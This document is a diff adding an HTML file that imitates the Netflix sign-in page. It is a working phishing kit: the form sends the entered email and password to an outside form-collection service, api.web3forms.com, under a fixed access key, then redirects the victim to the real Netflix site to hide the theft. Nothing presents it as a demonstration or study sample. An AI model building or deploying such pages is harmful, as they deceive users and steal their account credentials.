@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Sign In</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-image: url('img.jpg');
+            color: #fff;
+            height: 100%;
+        }
+        .login-container {
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 60px 68px 40px;
+            background-color: rgba(0,0,0,0.75);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .login-form {
+            width: 100%;
+        }
+        h1 {
+            font-size: 32px;
+            margin-bottom: 28px;
+        }
+        .input-wrapper {
+            margin-bottom: 16px;
+        }
+        .input-wrapper input {
+            width: 100%;
+            padding: 16px;
+            background-color: #333;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+        }
+        .signin-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #e50914;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 24px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .signin-btn:hover {
+            background-color: #f6121d;
+        }
+        .form-extras {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 16px;
+            font-size: 13px;
+        }
+        .remember-me {
+            display: flex;
+            align-items: center;
+        }
+        .remember-me input {
+            margin-right: 6px;
+        }
+        .need-help {
+            color: #b3b3b3;
+            text-decoration: none;
+        }
+        .signup-link {
+            text-align: center;
+            margin-top: 16px;
+            color: #b3b3b3;
+        }
+        .signup-link a {
+            color: #fff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="bf7bb1f6-d596-4c1e-8cfb-3efcdc367eaf">
+            <h1>Sign In to Netflix</h1>
+            <div class="input-wrapper">
+                <input type="text" name= "Email" placeholder="Email or phone number" id="email" required>
+            </div>
+            <div class="input-wrapper">
+                <input type="password" name="NefPasw" placeholder="Password" id="password" required>
+            </div>
+            <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+            <input type="hidden" name="redirect" value="https://www.netflix.com/">
+            <button type="submit" class="signin-btn">Sign In</button>
+            
+            <div class="form-extras">
+                <label class="remember-me">
+                    <input type="checkbox" id="rememberMe">
+                    Remember me
+                </label>
+                <a href="#" class="need-help">Need help?</a>
+            </div>
+            
+            <div class="signup-link">
+                New to Netflix? <a href="#">Sign up now</a>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const rememberMe = document.getElementById('rememberMe').checked;
+            
+            // In a real application, you would handle authentication here
+            console.log('Login attempted with:', {
+                email,
+                password,
+                rememberMe
+            });
+            
+            // Simulated login feedback
+            alert('Sign in successfully');
+        });
+    </script>
+</body>
+</html>
